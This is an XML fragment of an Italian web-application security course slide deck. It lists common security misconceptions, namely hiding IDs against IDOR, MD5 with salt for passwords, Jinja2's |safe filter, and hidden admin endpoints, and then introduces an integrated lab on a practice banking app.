            <a:r>
              <a:rPr/>
              <a:t>❌ Hide ID in UI = difesa da IDOR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>❌ MD5 + salt = OK per password (no, troppo veloce)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>❌ Disabilitare escape Jinja2 con </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>|safe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>❌ “Il mio endpoint admin è nascosto”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M7 — Lab Integrato (2h)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Sai cercare e correggere. Adesso fallo su BancaPiccola completa.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— Sicurezza delle Applicazioni Web</dc:title>
  <dc:creator>Ing. Alessandro Manneschi</dc:creator>
  <cp:keywords/>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-05-06T20:45:24Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-06T20:45:24Z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